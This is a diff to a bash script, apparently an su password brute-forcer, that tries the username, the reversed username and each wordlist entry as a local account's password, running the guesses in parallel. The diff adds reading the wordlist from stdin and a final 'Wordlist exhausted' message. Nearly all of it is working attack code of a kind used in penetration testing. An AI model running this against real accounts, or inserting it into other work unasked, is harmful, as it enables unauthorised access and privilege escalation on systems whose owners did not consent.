@@ -26,8 +26,7 @@ done
 
 if ! [ "$USER" ]; then printf "$help"; exit 0; fi
 
-
-if ! [ -f "$WORDLIST" ]; then echo "Wordlist ($WORDLIST) not found!"; exit 0; fi
+if ! [[ -p /dev/stdin ]] && ! [ $WORDLIST = "-" ] && ! [ -f "$WORDLIST" ]; then echo "Wordlist ($WORDLIST) not found!"; exit 0; fi
 
 C=$(printf '\033')
 
@@ -48,13 +47,20 @@ su_brute_user_num (){
   su_try_pwd $USER $USER & #Try username as password
   su_try_pwd $USER `echo $USER | rev 2>/dev/null` &     #Try reverse username as password
 
-  while IFS='' read -r P || [ -n "${P}" ]; do # Loop through wordlist file
-    su_try_pwd $USER $P & #Try TOP TRIES of passwords (by default 2000)
-    sleep $SLEEPPROC # To not overload the system
-  done < $WORDLIST
+  if ! [[ -p /dev/stdin ]] && [ -f "$WORDLIST" ]; then
+    while IFS='' read -r P || [ -n "${P}" ]; do # Loop through wordlist file   
+      su_try_pwd $USER $P & #Try TOP TRIES of passwords (by default 2000)
+      sleep $SLEEPPROC # To not overload the system
+    done < $WORDLIST
 
-
+  else
+    cat - | while read line; do
+      su_try_pwd $USER $line & #Try TOP TRIES of passwords (by default 2000)    
+      sleep $SLEEPPROC # To not overload the system
+    done
+  fi
   wait
 }
 
 su_brute_user_num $USER
+echo "  Wordlist exhausted" | sed "s,.*,${C}[1;31;107m&${C}[0m,"
